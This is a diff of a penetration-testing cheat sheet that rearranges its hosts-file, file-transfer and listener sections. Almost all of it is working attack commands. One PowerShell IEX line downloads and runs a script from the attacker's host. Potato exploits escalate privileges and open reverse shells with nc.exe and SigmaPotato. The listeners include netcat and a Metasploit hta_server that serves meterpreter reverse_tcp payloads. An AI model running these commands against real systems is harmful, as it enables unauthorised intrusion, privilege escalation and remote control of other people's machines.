@@ -54,9 +54,6 @@ cat *.nmap
 (enum4linux $TARGET -u '$USERNAME' -p '$PASSWORD' -A > enum4linux_$TARGET &)
 cat usernames | sed -n 's/.*\\//p' | cut -d ' ' -f 1
 
-## Hosts
-echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
-
 ## Web
 [*] Technology
 whatweb http://$TARGET
@@ -94,13 +91,15 @@ wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 # Exploitation
-## File Transfer
-python3 -m http.server 80 -d ~/Upload
-powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1''); dir C:\programdata\tmp"
+## Hosts
+echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 
 ## Sorting Files
 sort -u usernames | tee usernames
 sort -u passwords | tee passwords
+
+## File Transfer
+powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1''); dir C:\programdata\tmp"
 
 ## Web
 [*] Web Shell
@@ -265,6 +264,7 @@ C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
 C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
 
 +---------- Listeners ----------+
+python3 -m http.server 80 -d ~/Upload
 rlwrap nc -lvnp 5555
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
